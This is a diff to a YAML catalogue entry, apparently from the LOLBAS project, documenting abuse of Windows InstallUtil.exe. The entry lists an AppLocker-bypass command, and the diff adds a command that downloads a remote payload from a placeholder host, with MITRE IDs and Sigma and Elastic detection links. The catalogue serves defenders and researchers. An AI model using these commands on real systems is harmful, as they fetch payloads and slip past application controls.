@@ -1,7 +1,7 @@
 ---
 Name: Installutil.exe
 Description: The Installer tool is a command-line utility that allows you to install and uninstall server resources by executing the installer components in specified assemblies
-Author: 'Oddvar Moe'
+Author: Oddvar Moe
 Created: 2018-05-25
 Commands:
   - Command: InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll
@@ -18,13 +18,18 @@ Commands:
     Privileges: User
     MitreID: T1218.004
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
+  - Command: InstallUtil.exe https://example.com/payload
+    Description: It will download a remote payload and place it in the cache folder (for example - %LOCALAPPDATA%\Microsoft\Windows\INetCache\IE)
+    Usecase: Downloads payload from remote server
+    Category: Download
+    Privileges: User
+    MitreID: T1105
+    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
 Full_Path:
   - Path: C:\Windows\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe
   - Path: C:\Windows\Microsoft.NET\Framework64\v2.0.50727\InstallUtil.exe
   - Path: C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe
   - Path: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe
-Code_Sample:
-  - Code:
 Detection:
   - Sigma: https://github.com/SigmaHQ/sigma/blob/a04fbe2a99f1dcbbfeb0ee4957ae4b06b0866254/rules/windows/process_creation/win_possible_applocker_bypass.yml
   - Elastic: https://github.com/elastic/detection-rules/blob/cc241c0b5ec590d76cb88ec638d3cc37f68b5d50/rules/windows/defense_evasion_installutil_beacon.toml
@@ -39,3 +44,5 @@ Resources:
 Acknowledgement:
   - Person: Casey Smith
     Handle: '@subtee'
+  - Person: Nir Chako (Pentera)
+    Handle: '@C_h4ck_0'
